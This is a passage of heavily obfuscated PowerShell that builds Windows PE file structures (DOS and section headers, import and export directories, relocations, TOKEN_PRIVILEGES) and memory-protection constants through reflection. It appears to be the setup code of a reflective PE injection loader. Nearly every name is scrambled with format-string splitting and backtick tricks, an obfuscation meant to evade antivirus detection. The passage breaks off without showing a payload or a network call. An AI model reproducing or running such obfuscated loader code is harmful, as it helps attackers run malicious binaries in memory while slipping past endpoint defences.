		${typ`E`BUi`Lder}.("{1}{2}{0}" -f 'ld','Def','ineFie').Invoke(("{0}{1}"-f 'e','_magic'), [UInt16], ("{0}{1}"-f 'Publ','ic')) | &("{1}{2}{0}" -f'l','O','ut-Nul')
		${T`Ypeb`Ui`lDer}.("{0}{2}{1}" -f 'Def','ield','ineF').Invoke(("{2}{0}{1}"-f 'bl','p','e_c'), [UInt16], ("{1}{0}"-f'ic','Publ')) | &("{0}{2}{1}"-f 'Ou','-Null','t')
		${TY`pe`B`UiLDeR}.("{0}{1}{2}"-f 'DefineFi','el','d').Invoke(("{0}{1}"-f'e_','cp'), [UInt16], ("{0}{1}"-f'Publi','c')) | &("{1}{2}{0}"-f'ull','Ou','t-N')
		${Ty`PE`Bu`ilDeR}.("{0}{2}{1}" -f'De','d','fineFiel').Invoke(("{0}{1}{2}"-f 'e_','cr','lc'), [UInt16], ("{0}{1}{2}"-f 'Pu','bl','ic')) | &("{1}{0}"-f 'l','Out-Nul')
		${tyPeBu`Il`dEr}.("{0}{2}{3}{1}" -f 'D','Field','efin','e').Invoke(("{2}{0}{1}" -f'cparhd','r','e_'), [UInt16], ("{0}{1}" -f'Pu','blic')) | &("{2}{1}{0}"-f 'll','t-Nu','Ou')
		${tYpE`B`UildEr}.("{1}{0}{2}"-f 'i','Def','neField').Invoke(("{2}{1}{0}" -f 'c','inallo','e_m'), [UInt16], ("{0}{1}"-f'Publi','c')) | &("{0}{1}{2}"-f 'O','ut-Nul','l')
		${tY`Pebu`I`lder}.("{0}{3}{1}{2}"-f 'D','fine','Field','e').Invoke(("{2}{0}{1}" -f 'maxall','oc','e_'), [UInt16], ("{0}{1}" -f 'Pub','lic')) | &("{0}{1}"-f'Out-Nul','l')
		${T`YPebui`lD`Er}.("{0}{3}{2}{1}"-f'De','ld','Fie','fine').Invoke(("{0}{1}"-f'e','_ss'), [UInt16], ("{0}{1}"-f 'Publi','c')) | &("{1}{0}" -f't-Null','Ou')
		${TYpebuI`lD`Er}.("{2}{1}{0}"-f 'neField','i','Def').Invoke(("{1}{0}"-f '_sp','e'), [UInt16], ("{0}{1}" -f'Pu','blic')) | &("{1}{2}{0}" -f 'ull','Ou','t-N')
		${tY`PEbuI`L`der}.("{0}{1}{2}" -f 'Defin','eFie','ld').Invoke(("{0}{1}" -f 'e_c','sum'), [UInt16], ("{0}{1}" -f 'P','ublic')) | &("{0}{1}"-f'Out-','Null')
		${typ`eB`UILD`ER}.("{1}{3}{2}{0}"-f'eld','D','Fi','efine').Invoke(("{0}{1}"-f 'e_','ip'), [UInt16], ("{1}{0}"-f'ublic','P')) | &("{0}{2}{1}"-f 'Ou','Null','t-')
		${t`YpEbUil`D`ER}.("{1}{2}{0}" -f'Field','D','efine').Invoke(("{0}{1}"-f'e_','cs'), [UInt16], ("{0}{1}" -f'Pu','blic')) | &("{1}{2}{0}"-f'll','O','ut-Nu')
		${TYPEbU`iL`D`eR}.("{1}{2}{0}" -f 'eld','De','fineFi').Invoke(("{1}{0}" -f'arlc','e_lf'), [UInt16], ("{1}{0}"-f 'ublic','P')) | &("{1}{0}{2}"-f'ut-Nul','O','l')
		${T`Yp`EbUi`ldEr}.("{1}{0}{2}"-f'efi','D','neField').Invoke(("{1}{0}"-f'ovno','e_'), [UInt16], ("{1}{0}" -f'c','Publi')) | &("{2}{1}{0}" -f 'Null','ut-','O')

		${E`_ReSF`IElD} = ${t`yPEb`UI`ldeR}.("{1}{3}{0}{2}" -f 'eFiel','Def','d','in').Invoke(("{1}{0}"-f '_res','e'), [UInt16[]], ("{1}{4}{2}{3}{0}"-f'hal','Public, H','ldM','ars','asFie'))
		${cOnstR`UcTO`R`V`ALue} =   (&("{1}{2}{0}" -f'lE','VAri','ab') 27lxU  )."V`Alue"::"By`V`A`lARRay"
		${fi`e`lDaRrAy} = @( ( &("{1}{2}{0}"-f 'TEM','chi','Ldi') ("V"+"AriaBle:"+"3"+"w78")  )."val`Ue".("{0}{1}"-f'G','etField').Invoke(("{0}{2}{1}" -f'Si','st','zeCon')))
		${ATtrI`Bbu`I`LDER} = &("{1}{0}{2}" -f'j','New-Ob','ect') ("{12}{10}{5}{0}{7}{11}{8}{1}{6}{3}{4}{2}{9}" -f '.Reflection.Emi','tomA','de','eB','uil','tem','ttribut','t','Cus','r','s','.','Sy')(${C`onSTRuc`ToRIN`FO}, ${cOn`STrU`Ct`o`Rva`LuE}, ${FiEL`dARr`AY}, @([Int32] 4))
		${E`_RESfie`lD}.("{2}{1}{0}{4}{5}{3}" -f 't','Cus','Set','ttribute','om','A').Invoke(${aT`Tr`IB`Bu`ILDEr})

		${typebuI`Ld`eR}.("{2}{0}{1}" -f 'efineFie','ld','D').Invoke(("{0}{1}" -f'e_o','emid'), [UInt16], ("{0}{1}"-f 'Pub','lic')) | &("{2}{0}{1}" -f 't-N','ull','Ou')
		${tYP`eb`UILdEr}.("{2}{1}{0}" -f'ld','Fie','Define').Invoke(("{1}{2}{0}" -f 'minfo','e','_oe'), [UInt16], ("{1}{0}"-f'ic','Publ')) | &("{0}{1}{2}" -f'O','ut-Nu','ll')

		${E_`Re`s2fie`ld} = ${typ`EBUI`Ld`er}.("{0}{2}{1}" -f 'Defin','ld','eFie').Invoke(("{1}{0}"-f '2','e_res'), [UInt16[]], ("{4}{2}{5}{1}{0}{3}"-f 'h','ars','lic, Has','al','Pub','FieldM'))
		${c`onsTrUCTo`RVal`Ue} =  ( &('lS') VARIAbLE:27LXu  )."V`ALuE"::"B`YvalaR`Ray"
		${A`TT`R`ibB`UIlder} = &("{2}{0}{1}"-f 'bjec','t','New-O') ("{6}{5}{3}{0}{8}{2}{1}{7}{4}" -f 'it.Cu','bu','ttri','lection.Em','ilder','stem.Ref','Sy','teBu','stomA')(${COn`stRUCtOR`INFO}, ${CoNs`T`R`Ucto`Rval`Ue}, ${fIelDa`Rr`AY}, @([Int32] 10))
		${e_r`eS2fi`eld}.("{0}{2}{1}{3}" -f 'SetC','Att','ustom','ribute').Invoke(${at`TRIbBU`ildER})

		${t`YPebuI`LDER}.("{0}{2}{1}" -f 'Defin','ield','eF').Invoke(("{0}{2}{1}"-f'e_','w','lfane'), [Int32], ("{1}{0}"-f 'c','Publi')) | &("{0}{1}" -f 'Out','-Null')
		${ImagE_DOs`_He`A`Der} = ${TY`p`eBu`ilDEr}.("{2}{0}{1}"-f'Typ','e','Create').Invoke()	
		${win3`2t`Yp`eS} | &("{1}{0}{2}"-f'-Me','Add','mber') -MemberType ("{2}{1}{0}{3}"-f 'rop','P','Note','erty') -Name ("{4}{3}{1}{0}{2}" -f 'E_DOS_HEA','G','DER','MA','I') -Value ${ImagE_`DOs`_`H`eAD`Er}

		
		${aTtrI`BUt`Es} = ("{10}{13}{16}{14}{21}{11}{0}{7}{1}{8}{15}{5}{3}{12}{9}{17}{4}{18}{20}{6}{2}{19}" -f 's, Publ',', Se','reFie','i','a','t','o','ic','q','La','AutoLa','s','al','yout, A','as','uen','nsiCl','yout, Se','led, ','ldInit','Bef','s, Cla')
		${Typ`ebUi`LDer} = ${M`odU`leb`UiLDeR}.("{1}{0}{2}" -f'efineT','D','ype').Invoke(("{0}{4}{3}{2}{1}"-f 'IMAGE_SEC','ADER','ON_HE','I','T'), ${AttR`IB`UT`eS}, [System.ValueType], 40)

		${nAmEFI`E`ld} = ${t`ypeBU`I`LDEr}.("{1}{3}{0}{2}"-f 'neF','De','ield','fi').Invoke(("{0}{1}" -f'Nam','e'), [Char[]], ("{3}{1}{0}{2}" -f 'asFieldMa','lic, H','rshal','Pub'))
		${c`OnS`TrucTor`V`ALUe} =   ( &("{3}{2}{0}{1}" -f 'ilD','itEM','h','GeT-c')  ("varIA"+"bL"+"e:"+"27LXu") )."VAl`UE"::"byv`Al`ARRAY"
		${A`TTRIB`B`UI`Lder} = &("{3}{0}{1}{2}"-f'e','c','t','New-Obj') ("{6}{7}{0}{5}{2}{4}{1}{9}{8}{3}"-f'.Reflec','Bui','.CustomAttrib','er','ute','tion.Emit','Syst','em','d','l')(${CONst`RuC`T`Or`iNFo}, ${cOnS`T`RUctO`R`VALUe}, ${fI`e`ld`ArrAY}, @([Int32] 8))
		${na`MEF`IELd}.("{1}{3}{2}{4}{0}" -f'te','SetCustom','ttri','A','bu').Invoke(${aT`TRiBb`Ui`lder})

		${t`Y`Pe`BUiLdEr}.("{3}{1}{2}{0}" -f'ld','fine','Fie','De').Invoke(("{2}{0}{3}{1}" -f 'ir','lSize','V','tua'), [UInt32], ("{1}{2}{0}" -f 'blic','P','u')) | &("{0}{2}{1}" -f'Out-','ll','Nu')
		${T`yp`EB`UILdeR}.("{2}{0}{1}"-f 'efineFi','eld','D').Invoke(("{0}{2}{1}{3}"-f'Virt','lAddres','ua','s'), [UInt32], ("{2}{1}{0}"-f 'c','i','Publ')) | &("{0}{1}"-f 'Out-N','ull')
		${t`yPEb`UildeR}.("{1}{0}{3}{2}"-f'efineFi','D','d','el').Invoke(("{3}{0}{1}{2}"-f 'RawD','at','a','SizeOf'), [UInt32], ("{0}{1}" -f'Publi','c')) | &("{1}{0}{2}" -f't','Ou','-Null')
		${Typeb`U`ILd`er}.("{2}{1}{0}" -f 'd','iel','DefineF').Invoke(("{0}{2}{1}{4}{3}"-f 'P','te','oin','RawData','rTo'), [UInt32], ("{1}{0}" -f'ublic','P')) | &("{2}{1}{0}" -f 'l','ul','Out-N')
		${T`y`pEBUi`lDer}.("{3}{2}{1}{0}"-f'ld','neFie','fi','De').Invoke(("{0}{1}{3}{2}{4}" -f 'P','ointerT','ocati','oRel','ons'), [UInt32], ("{1}{0}" -f 'ublic','P')) | &("{1}{2}{0}" -f'll','Ou','t-Nu')
		${TYpEbuI`l`der}.("{2}{1}{0}" -f 'Field','e','Defin').Invoke(("{1}{0}{3}{2}"-f'interTo','Po','ers','Linenumb'), [UInt32], ("{0}{1}" -f'Publ','ic')) | &("{0}{1}" -f'Out','-Null')
		${Ty`PEBuI`lDER}.("{2}{1}{0}" -f 'Field','efine','D').Invoke(("{0}{4}{2}{3}{1}" -f'NumberO','s','ocatio','n','fRel'), [UInt16], ("{1}{0}"-f'blic','Pu')) | &("{1}{0}"-f'll','Out-Nu')
		${TYPe`B`UIlD`Er}.("{2}{0}{3}{1}"-f'fineFi','ld','De','e').Invoke(("{0}{1}{3}{2}{4}" -f 'Nu','mbe','Linenumbe','rOf','rs'), [UInt16], ("{1}{0}"-f 'lic','Pub')) | &("{0}{1}{2}" -f'Ou','t','-Null')
		${TypebUi`L`D`er}.("{0}{2}{1}"-f'D','eField','efin').Invoke(("{3}{0}{4}{2}{1}" -f 'h','stics','racteri','C','a'), [UInt32], ("{2}{0}{1}"-f'u','blic','P')) | &("{1}{0}"-f'ull','Out-N')
		${I`M`AGE_`SE`ctI`on_HeadeR} = ${t`Ypebu`IldEr}.("{3}{1}{0}{2}" -f 'eT','eat','ype','Cr').Invoke()
		${win`32TY`Pes} | &("{1}{2}{0}"-f'ber','Add-','Mem') -MemberType ("{1}{2}{0}"-f 'ty','NotePr','oper') -Name ("{3}{1}{4}{5}{2}{0}" -f 'R','E','ADE','IMAG','_SE','CTION_HE') -Value ${i`mAGe_SeC`TiON_H`e`A`DEr}

		
		${Att`RIBU`T`ES} = ("{14}{11}{1}{8}{5}{15}{6}{13}{3}{4}{9}{10}{12}{0}{2}{7}"-f'i','ayou','eldIni','l','i','iC','ass','t','t, Ans','c, Sequential','Layout, Sealed, Before','toL','F',', Class, Pub','Au','l')
		${T`ypEB`Ui`LDer} = ${m`oDuLE`BUIlder}.("{1}{0}{2}" -f'n','Defi','eType').Invoke(("{4}{0}{3}{2}{1}"-f 'A','CATION','RELO','GE_BASE_','IM'), ${AT`TrIbU`Tes}, [System.ValueType], 8)
		${TY`pebU`IlDEr}.("{2}{0}{3}{1}" -f 'n','ield','Defi','eF').Invoke(("{1}{0}{2}{3}"-f'A','Virtual','ddr','ess'), [UInt32], ("{2}{1}{0}" -f 'blic','u','P')) | &("{1}{2}{0}" -f 'ull','Ou','t-N')
		${TyP`eb`UILDER}.("{2}{0}{1}{3}"-f 'e','fineFie','D','ld').Invoke(("{2}{1}{0}"-f 'fBlock','izeO','S'), [UInt32], ("{0}{1}"-f'P','ublic')) | &("{0}{1}"-f 'Out','-Null')
		${I`magE_`BASE_RE`loCAt`I`ON} = ${T`ype`BuiLdEr}.("{1}{2}{0}"-f'ype','Cre','ateT').Invoke()
		${wiN32t`Y`PeS} | &("{0}{1}{2}" -f 'A','dd-Membe','r') -MemberType ("{2}{0}{3}{1}" -f'eP','y','Not','ropert') -Name ("{1}{5}{3}{4}{0}{2}"-f'I','IM','ON','B','ASE_RELOCAT','AGE_') -Value ${imaGe`_BAse_Relo`ca`Tion}

		
		${AT`TrIb`UtES} = ("{12}{17}{5}{2}{0}{6}{15}{8}{4}{14}{10}{1}{13}{3}{11}{9}{7}{16}" -f'ass, Cl','u','t, AnsiCl','e',' Se','Layou','ass',' BeforeField','blic,',',','tialLayo','d','Aut','t, Seal','quen',', Pu','Init','o')
		${t`yP`ebuildER} = ${mo`duLeb`U`ILDeR}.("{0}{2}{1}" -f'Defi','e','neTyp').Invoke(("{4}{1}{2}{5}{0}{3}" -f 'IP','E_','IM','TOR','IMAG','PORT_DESCR'), ${A`Ttr`Ib`UTES}, [System.ValueType], 20)
		${T`yPEb`U`IlDeR}.("{1}{3}{0}{2}"-f'l','DefineF','d','ie').Invoke(("{0}{2}{3}{1}"-f'Cha','ics','ra','cterist'), [UInt32], ("{1}{2}{0}" -f 'ic','P','ubl')) | &("{1}{0}{2}" -f'-Nul','Out','l')
		${typ`Ebui`lder}.("{2}{1}{0}{3}" -f 'Fi','ine','Def','eld').Invoke(("{0}{1}{2}"-f'Ti','meDateSt','amp'), [UInt32], ("{0}{1}"-f'Publi','c')) | &("{2}{0}{1}"-f't-Nu','ll','Ou')
		${T`ypeBu`ildEr}.("{3}{0}{1}{2}"-f'n','eFie','ld','Defi').Invoke(("{1}{4}{2}{3}{0}"-f 'n','Fo','rderCh','ai','rwa'), [UInt32], ("{0}{1}"-f'P','ublic')) | &("{0}{1}{2}"-f'O','ut-N','ull')
		${TYpE`Bu`Il`der}.("{0}{3}{2}{1}" -f'Defin','eld','i','eF').Invoke(("{0}{1}" -f'Nam','e'), [UInt32], ("{1}{0}" -f 'ublic','P')) | &("{0}{1}{2}"-f'Ou','t-Nul','l')
		${TyPebU`I`LDeR}.("{0}{2}{1}"-f 'Defi','eld','neFi').Invoke(("{3}{1}{0}{2}"-f'h','stT','unk','Fir'), [UInt32], ("{0}{1}" -f 'Pub','lic')) | &("{1}{0}{2}" -f'N','Out-','ull')
		${IMA`G`e_`ImPoR`T_deSCriptoR} = ${TY`pEBU`ILDEr}.("{3}{2}{0}{1}" -f'Ty','pe','te','Crea').Invoke()
		${WIN32t`Y`pEs} | &("{1}{3}{0}{2}" -f'-Mem','A','ber','dd') -MemberType ("{2}{1}{0}" -f'perty','ePro','Not') -Name ("{1}{0}{2}{5}{6}{4}{3}" -f 'MAGE_IMP','I','O','PTOR','RI','R','T_DESC') -Value ${ImA`GE_IM`P`oRt_`DESC`RipTOR}

		
		${A`TTRib`U`TES} = ("{2}{5}{7}{3}{16}{11}{6}{14}{12}{4}{9}{0}{1}{17}{8}{13}{15}{10}" -f 'le','d,','AutoLay','AnsiClass','ut, Se','out','Public,',', ','F','a','nit','Class, ','ntialLayo','ie',' Seque','ldI',', ',' Before')
		${tyPE`BU`il`DER} = ${mO`duleB`Uil`dER}.("{2}{1}{0}" -f'pe','eTy','Defin').Invoke(("{2}{4}{3}{0}{1}" -f'XPORT_DIRECTO','RY','I','E_E','MAG'), ${aTtR`Ib`UteS}, [System.ValueType], 40)
		${tYPEb`Ui`LdER}.("{0}{2}{1}"-f'D','Field','efine').Invoke(("{2}{1}{0}"-f'acteristics','har','C'), [UInt32], ("{0}{1}"-f'Publi','c')) | &("{0}{1}{2}" -f 'Out-Nu','l','l')
		${TYPeb`UIl`dEr}.("{1}{0}{2}" -f 'efineF','D','ield').Invoke(("{3}{2}{0}{1}"-f 'eDat','eStamp','m','Ti'), [UInt32], ("{0}{1}{2}"-f'Pu','bli','c')) | &("{0}{2}{1}"-f'Out','ull','-N')
		${t`Yp`E`BuILDER}.("{0}{1}{2}" -f 'Define','Fie','ld').Invoke(("{1}{2}{0}"-f 'ion','MajorVer','s'), [UInt16], ("{0}{1}{2}"-f 'P','ub','lic')) | &("{2}{0}{1}" -f '-Nu','ll','Out')
		${tYPE`B`Uild`ER}.("{1}{2}{0}{3}"-f'Fie','D','efine','ld').Invoke(("{0}{1}{2}{3}"-f'Minor','V','ers','ion'), [UInt16], ("{0}{1}" -f 'Publi','c')) | &("{0}{1}{2}" -f 'Ou','t-','Null')
		${t`YP`EbU`iLder}.("{0}{2}{1}{3}" -f'De','neFiel','fi','d').Invoke(("{0}{1}" -f'Nam','e'), [UInt32], ("{1}{2}{0}"-f'c','Pub','li')) | &("{0}{1}{2}" -f'Out-Nu','l','l')
		${ty`PEB`Uil`Der}.("{0}{1}{2}"-f 'Def','ineFie','ld').Invoke(("{1}{0}"-f'ase','B'), [UInt32], ("{1}{0}{2}"-f 'u','P','blic')) | &("{0}{1}{2}" -f'Out','-N','ull')
		${tYP`e`BuIl`dEr}.("{2}{1}{3}{0}" -f 'd','e','Defin','Fiel').Invoke(("{2}{0}{3}{1}{4}" -f 'umb','OfFun','N','er','ctions'), [UInt32], ("{0}{1}"-f 'P','ublic')) | &("{0}{1}{2}"-f 'O','ut-Nu','ll')
		${T`Y`PeB`UiLdER}.("{1}{0}{2}"-f'eFie','Defin','ld').Invoke(("{1}{2}{0}"-f 'Names','Nu','mberOf'), [UInt32], ("{1}{0}" -f 'c','Publi')) | &("{1}{2}{0}" -f'Null','Out','-')
		${tYP`eb`UIlDEr}.("{2}{3}{1}{0}"-f'eld','eFi','Defi','n').Invoke(("{3}{0}{1}{2}"-f 'ddr','essOf','Functions','A'), [UInt32], ("{0}{1}{2}"-f 'Pu','b','lic')) | &("{2}{1}{0}" -f't-Null','u','O')
		${Ty`PebUI`LDER}.("{2}{0}{1}" -f'ine','Field','Def').Invoke(("{0}{1}{3}{2}"-f 'Add','ressOf','s','Name'), [UInt32], ("{1}{0}{2}" -f'bl','Pu','ic')) | &("{2}{0}{1}"-f't','-Null','Ou')
		${ty`p`E`BUilDeR}.("{2}{0}{1}{3}"-f 'ine','Fi','Def','eld').Invoke(("{1}{0}{3}{5}{2}{4}{6}"-f'essOfN','Addr','rdin','a','a','meO','ls'), [UInt32], ("{1}{0}" -f 'ic','Publ')) | &("{0}{2}{1}" -f'Out-','ll','Nu')
		${imagE_EXpoR`T`_`DIRe`CTORY} = ${tYp`E`BuiLDer}.("{1}{2}{0}"-f'pe','CreateT','y').Invoke()
		${win`3`2TYPes} | &("{1}{0}{3}{2}" -f 'dd-','A','er','Memb') -MemberType ("{1}{0}{2}"-f'r','NotePrope','ty') -Name ("{4}{2}{0}{5}{1}{3}"-f 'GE_E','T_DIRECTOR','MA','Y','I','XPOR') -Value ${ImAgE_EXp`ort`_D`IrECtoRy}
		
		
		${a`Tt`R`IbuteS} = ("{15}{18}{8}{6}{4}{11}{3}{1}{12}{10}{17}{5}{0}{7}{14}{16}{2}{9}{13}" -f'blic, Seq',' C','ed, Be',',','i','u',' Ans','uenti','Layout,','foreFieldIni','ass, ','Class','l','t','alLa','Aut','yout, Seal','P','o')
		${tYP`eB`UILD`eR} = ${m`oDUlE`BuiL`d`eR}.("{0}{2}{1}{3}"-f 'Defi','Typ','ne','e').Invoke(("{1}{0}"-f 'D','LUI'), ${A`TtrI`BU`TES}, [System.ValueType], 8)
		${TyP`eb`Ui`LdEr}.("{1}{3}{2}{0}" -f 'ld','De','neFie','fi').Invoke(("{0}{1}{2}" -f'L','owPar','t'), [UInt32], ("{1}{0}"-f 'blic','Pu')) | &("{2}{0}{1}" -f'u','ll','Out-N')
		${typ`e`BuiLD`eR}.("{0}{2}{3}{1}" -f'D','d','ef','ineFiel').Invoke(("{2}{0}{1}" -f'gh','Part','Hi'), [UInt32], ("{0}{1}" -f'P','ublic')) | &("{1}{0}"-f 'll','Out-Nu')
		${l`UiD} = ${tYp`EB`UILDer}.("{1}{0}{2}" -f'reateT','C','ype').Invoke()
		${WiN3`2`TYpeS} | &("{2}{1}{3}{0}" -f'er','d','Ad','-Memb') -MemberType ("{0}{3}{2}{1}" -f 'Note','ty','r','Prope') -Name ("{1}{0}"-f'ID','LU') -Value ${LU`id}
		
		
		${aTTRi`B`UTES} = ("{10}{0}{9}{14}{8}{7}{5}{4}{1}{13}{2}{11}{12}{6}{3}{15}"-f 'toL',' P',' Se','Sealed, BeforeFie','s,','las',' ','ass, C','l','ayout, A','Au','quentialLayout',',','ublic,','nsiC','ldInit')
		${T`ype`BuIlDEr} = ${MOd`UL`EbuiLdeR}.("{0}{2}{1}" -f 'Defin','pe','eTy').Invoke(("{2}{1}{3}{0}" -f 'TRIBUTES','_AND_','LUID','AT'), ${a`TtribUt`Es}, [System.ValueType], 12)
		${TyPe`Bui`lDEr}.("{2}{3}{1}{0}" -f 'Field','ne','D','efi').Invoke(("{1}{0}" -f 'd','Lui'), ${l`UId}, ("{0}{1}"-f 'Publi','c')) | &("{2}{1}{0}"-f 'Null','t-','Ou')
		${t`YpEbU`Il`Der}.("{1}{2}{0}" -f'eld','De','fineFi').Invoke(("{0}{1}{2}{3}" -f'A','t','tribut','es'), [UInt32], ("{0}{1}" -f'Pu','blic')) | &("{2}{1}{0}"-f'Null','ut-','O')
		${lU`id_aN`D_A`T`TRib`Utes} = ${tY`PEB`UI`LDER}.("{0}{3}{1}{2}" -f 'C','y','pe','reateT').Invoke()
		${W`IN`32typ`es} | &("{1}{0}{2}"-f '-Me','Add','mber') -MemberType ("{2}{1}{3}{0}" -f 'y','teProp','No','ert') -Name ("{0}{1}{3}{2}" -f'LUID_AND','_A','TES','TTRIBU') -Value ${lu`Id_`A`ND_`AtTRiBUT`es}
		
		
		${AtT`R`iB`Utes} = ("{20}{2}{6}{3}{11}{10}{22}{21}{19}{13}{4}{7}{16}{14}{9}{15}{5}{18}{1}{0}{8}{12}{17}" -f 'eFi',' Befor','t','ayo',', Publ','Se','oL','ic, Seq','e','n',' An','ut,','ldI','Class','e','tialLayout, ','u','nit','aled,','s, ','Au','las','siC')
		${Ty`PE`Bu`iLdER} = ${mO`d`UlE`B`UiLdEr}.("{0}{1}{2}" -f'D','efineTyp','e').Invoke(("{1}{3}{2}{0}"-f'GES','TOKE','PRIVILE','N_'), ${A`TTR`iB`UteS}, [System.ValueType], 16)
		${TYPeB`UILd`er}.("{2}{0}{1}{3}" -f 'efi','neFiel','D','d').Invoke(("{3}{0}{1}{2}" -f'iv','i','legeCount','Pr'), [UInt32], ("{1}{0}"-f 'lic','Pub')) | &("{1}{0}" -f 'll','Out-Nu')
		${T`y`peBuilDer}.("{0}{2}{1}"-f'Define','d','Fiel').Invoke(("{1}{0}{2}"-f 'ivile','Pr','ges'), ${LUI`d_a`ND_a`Ttr`ibut`eS}, ("{1}{0}" -f 'ic','Publ')) | &("{2}{1}{0}" -f'-Null','t','Ou')
		${ToKEn_pR`iV`Ile`gEs} = ${Typ`E`Bu`ildeR}.("{2}{0}{1}" -f'ateT','ype','Cre').Invoke()
		${WIN`32T`ypeS} | &("{2}{1}{0}" -f'd-Member','d','A') -MemberType ("{0}{3}{1}{2}" -f'NoteP','pert','y','ro') -Name ("{0}{1}{3}{2}" -f'TOK','EN_PRIV','ES','ILEG') -Value ${T`oKen_P`RIv`IlE`GeS}

		return ${WI`N32`TYP`ES}
	}

	Function gE`T-`win32cOnSTa`NtS
	{
		${wI`N32`Con`sTAnTs} = &("{1}{2}{0}" -f '-Object','N','ew') ("{3}{1}{2}{0}" -f 'ect','.','Obj','System')
		
		${WI`N`32C`ON`StantS} | &("{2}{0}{1}"-f'dd-Membe','r','A') -MemberType ("{1}{2}{0}" -f'ty','Not','eProper') -Name ("{1}{2}{0}" -f'IT','MEM','_COMM') -Value 0x00001000
		${wiN32c`o`NsT`AnTs} | &("{1}{0}{2}"-f '-M','Add','ember') -MemberType ("{3}{2}{0}{1}" -f 'per','ty','ro','NoteP') -Name ("{1}{2}{0}"-f'E','MEM_RESE','RV') -Value 0x00002000
		${wi`N32`cOnstaN`Ts} | &("{1}{2}{0}" -f'er','Add-M','emb') -MemberType ("{2}{0}{1}" -f 'oteP','roperty','N') -Name ("{2}{3}{0}{1}"-f 'C','ESS','PAGE_NO','AC') -Value 0x01
		${Win32`cOnsT`A`N`TS} | &("{0}{3}{1}{2}"-f 'A','emb','er','dd-M') -MemberType ("{1}{2}{0}"-f'rty','Not','ePrope') -Name ("{3}{1}{2}{0}" -f'Y','G','E_READONL','PA') -Value 0x02
		${WIN32`Co`N`stants} | &("{2}{0}{1}"-f'd-M','ember','Ad') -MemberType ("{2}{1}{0}"-f'erty','oteProp','N') -Name ("{0}{2}{3}{1}"-f'PAG','RITE','E_RE','ADW') -Value 0x04
		${WIN32C`O`NsT`ANts} | &("{0}{1}{2}"-f 'Add','-Memb','er') -MemberType ("{2}{1}{3}{0}"-f 'eProperty','o','N','t') -Name ("{1}{0}{2}{3}{4}"-f 'E_WRI','PAG','T','EC','OPY') -Value 0x08
		${w`I`N32cONstAN`TS} | &("{0}{2}{1}" -f'Add-Me','ber','m') -MemberType ("{3}{1}{2}{0}"-f'perty','ote','Pro','N') -Name ("{0}{1}{2}{3}" -f'P','AGE_E','XECU','TE') -Value 0x10
		${win`32c`On`sTan`TS} | &("{1}{2}{0}"-f'r','Add-','Membe') -MemberType ("{1}{3}{2}{0}"-f 'ty','No','oper','tePr') -Name ("{0}{1}{2}{3}" -f 'P','AGE_EX','ECU','TE_READ') -Value 0x20
		${W`IN32C`ON`StAnts} | &("{1}{2}{0}" -f'er','Ad','d-Memb') -MemberType ("{0}{3}{2}{1}" -f 'N','y','ropert','oteP') -Name ("{3}{0}{2}{1}{4}"-f'X','UTE_RE','EC','PAGE_E','ADWRITE') -Value 0x40
		${wi`N32coNST`A`NtS} | &("{2}{0}{1}"-f'd-M','ember','Ad') -MemberType ("{0}{2}{1}"-f 'No','operty','tePr') -Name ("{4}{1}{0}{2}{3}" -f 'ECU','AGE_EX','TE_W','RITECOPY','P') -Value 0x80
		${W`iN`32COnst`ANTs} | &("{0}{1}{2}" -f 'Add-M','emb','er') -MemberType ("{0}{1}{2}"-f 'Note','Pr','operty') -Name ("{0}{2}{1}{3}" -f 'P','E_N','AG','OCACHE') -Value 0x200
		${WIn32C`oN`ST`ANtS} | &("{0}{1}{2}"-f'Add','-Membe','r') -MemberType ("{1}{3}{2}{0}"-f'erty','N','rop','oteP') -Name ("{0}{5}{4}{6}{1}{2}{3}"-f'IMAGE','SED_ABSOLU','T','E','EL','_R','_BA') -Value 0
		${W`iN32C`OnS`Ta`Nts} | &("{0}{1}{2}"-f 'Add-Me','m','ber') -MemberType ("{1}{0}{2}" -f'eP','Not','roperty') -Name ("{2}{3}{5}{4}{0}{6}{1}"-f '_HIG','LOW','I','MAGE_REL','ASED','_B','H') -Value 3
		${W`in32`coNs`TanTs} | &("{0}{2}{1}"-f 'Add-M','r','embe') -MemberType ("{3}{2}{0}{1}"-f 'pe','rty','otePro','N') -Name ("{2}{1}{0}{3}" -f 'S','_REL_BA','IMAGE','ED_DIR64') -Value 10
		${W`I`N32`CoNst`ANTs} | &("{2}{3}{1}{0}" -f'er','Memb','Add','-') -MemberType ("{1}{3}{0}{2}"-f'er','NotePr','ty','op') -Name ("{5}{2}{3}{6}{0}{7}{4}{1}"-f 'C','LE','GE_SCN_ME','M_','AB','IMA','DIS','ARD') -Value 0x02000000
		${wIN3`2CO`N`StAN`TS} | &("{0}{1}{2}{3}" -f'A','dd-Memb','e','r') -MemberType ("{0}{1}{3}{2}" -f 'NoteP','rop','y','ert') -Name ("{2}{1}{5}{3}{4}{0}"-f'CUTE','GE_','IMA','CN_MEM_','EXE','S') -Value 0x20000000
		${WIN32`ConSTAN`Ts} | &("{0}{2}{1}"-f 'A','-Member','dd') -MemberType ("{2}{1}{0}"-f'roperty','eP','Not') -Name ("{3}{1}{2}{0}"-f'D','AGE_SCN_MEM_RE','A','IM') -Value 0x40000000
		${W`In32co`NstAN`TS} | &("{1}{2}{0}"-f'Member','Add','-') -MemberType ("{0}{2}{3}{1}"-f'Not','y','eProp','ert') -Name ("{3}{4}{2}{5}{1}{0}"-f 'E','RIT','E','IMA','GE_SCN_M','M_W') -Value 0x80000000
		${wI`N`32`coNSTA`Nts} | &("{2}{1}{0}"-f'r','-Membe','Add') -MemberType ("{2}{1}{0}" -f'y','tePropert','No') -Name ("{6}{0}{5}{2}{4}{3}{1}"-f'AGE_SC','ED','_M','H','EM_NOT_CAC','N','IM') -Value 0x04000000
		${Win3`2c`o`Nst`AntS} | &("{1}{2}{0}"-f'r','Add-M','embe') -MemberType ("{1}{2}{0}" -f 'ty','No','teProper') -Name ("{1}{0}{3}{2}" -f'DECO','MEM_','T','MMI') -Value 0x4000
		${wIN`32C`onsTAn`Ts} | &("{2}{1}{0}" -f 'r','dd-Membe','A') -MemberType ("{0}{2}{1}{3}" -f'No','ert','teProp','y') -Name ("{3}{0}{5}{4}{1}{2}"-f 'AGE_FI','CUTABLE_I','MAGE','IM','EXE','LE_') -Value 0x0002
		${WIn32`co`N`sta`NTS} | &("{1}{2}{0}" -f 'ember','Ad','d-M') -MemberType ("{0}{2}{1}"-f 'No','eProperty','t') -Name ("{2}{1}{0}{3}"-f'FILE_DL','GE_','IMA','L') -Value 0x2000
